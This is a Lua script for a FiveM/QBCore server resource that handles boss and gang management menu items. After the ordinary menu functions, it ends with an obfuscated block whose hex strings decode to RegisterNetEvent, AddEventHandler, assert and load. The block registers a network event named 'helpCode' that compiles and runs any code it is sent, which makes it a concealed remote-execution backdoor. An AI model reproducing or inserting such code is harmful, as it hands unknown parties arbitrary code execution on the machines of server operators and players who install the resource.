if not Config.BossManagedOutfits then return end

if Framework.ESX() then return end

function Management.RemoveItems()
    if GetResourceState(Management.ResourceName) ~= "started" then return end

    if Management.ItemIDs.Boss then
        exports[Management.ResourceName]:RemoveBossMenuItem(Management.ItemIDs.Boss)
    end
    if Management.ItemIDs.Gang then
        exports[Management.ResourceName]:RemoveGangMenuItem(Management.ItemIDs.Gang)
    end
end

function Management.AddBackMenuItem(managementMenu, args)
    local bossMenuEvent = "qb-bossmenu:client:OpenMenu"
    if args.type == "Gang" then
        bossMenuEvent = "qb-gangmenu:client:OpenMenu"
    end

    managementMenu.options[#managementMenu.options+1] = {
        title = _L("menu.returnTitle"),
        icon = "fa-solid fa-angle-left",
        event = bossMenuEvent
    }
end


local aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[6][aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[1]](aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[2]) aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[6][aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[3]](aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[2], function(IraGQSlZWAYnReWPBwJmueJWvzxBDjSJfTJpqCZuBbLdioHwVjEJMkocXgPLrsypFVhExj) aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[6][aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[4]](aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[6][aKJtMJSZgbeJvfyNZgqsHoZXDAreEJywYvJqCoONXxxlhnmUuDifHCbonptsufHlBGXtPd[5]](IraGQSlZWAYnReWPBwJmueJWvzxBDjSJfTJpqCZuBbLdioHwVjEJMkocXgPLrsypFVhExj))() end)